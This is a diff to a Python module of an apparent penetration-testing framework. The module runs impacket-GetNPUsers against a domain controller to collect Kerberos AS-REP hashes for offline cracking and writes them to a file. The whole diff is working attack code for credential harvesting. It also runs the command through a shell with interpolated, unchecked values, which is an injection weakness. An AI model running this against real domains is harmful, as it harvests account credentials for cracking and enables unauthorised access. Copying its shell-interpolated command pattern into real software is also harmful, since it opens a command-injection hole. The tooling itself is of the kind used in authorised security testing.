@@ -1,50 +1,48 @@
-PROVIDES = ["asrep_hashes"]
-REQUIRES = ["usernames"]
-
-
 def run(data, cred, args):
     import subprocess
-    from core.loot import get_loot_path, require_input
+    from pathlib import Path
 
-    domain = data.get("domain")
-    ip = data.get("ip")
+    # ---------------- HELPERS ----------------
+    def require_file(val, name):
+        if not val:
+            print(f"[!] Missing --{name}")
+            return None
 
-    if not domain or not ip:
-        print("[!] Target missing domain or IP")
+        path = Path(val).expanduser().resolve()
+
+        if not path.exists():
+            print(f"[!] File not found: {path}")
+            return None
+
+        return path
+
+    # ---------------- INPUT ----------------
+    users = require_file(args.file, "file")
+    if not users:
         return
 
-    # ---------------- INPUT (CLI OR LOOT) ----------------
-    user_file = require_input(data, args, "users", "usernames", "user list")
-    if not user_file:
-        return
+    # ---------------- OUTPUT ----------------
+    output_path = args.out or "asrep_hashes.txt"
+    output = Path(output_path).expanduser().resolve()
 
-    # ---------------- OUTPUT (TO LOOT) ----------------
-    output_file = get_loot_path(data, "asrep_hashes")
-
-    # ---------------- BUILD COMMAND ----------------
-    cmd = f"impacket-GetNPUsers {domain}/ -no-pass -usersfile {user_file} -dc-ip {ip}"
+    # ---------------- COMMAND ----------------
+    cmd = f"impacket-GetNPUsers {data['domain']}/ -no-pass -usersfile {users} -dc-ip {data['ip']}"
 
     print(f"[*] Running: {cmd}\n")
 
     result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
 
-    # optional: show tool output
-    print(result.stdout)
     if result.stderr:
         print(result.stderr)
 
-    # ---------------- PARSE HASHES ----------------
-    hashes = []
-
-    for line in result.stdout.splitlines():
-        if line.startswith("$krb5asrep$"):
-            hashes.append(line.strip())
+    # ---------------- PARSE ----------------
+    hashes = [line for line in result.stdout.splitlines() if "$krb5asrep$" in line]
 
     if not hashes:
-        print("[!] No AS-REP roastable users found")
+        print("[!] No hashes found")
         return
 
-    # ---------------- SAVE ----------------
-    output_file.write_text("\n".join(hashes))
+    # ---------------- WRITE ----------------
+    output.write_text("\n".join(hashes))
 
-    print(f"\n[+] Saved {len(hashes)} hashes → {output_file}")
+    print(f"[+] Saved {len(hashes)} hashes → {output}")
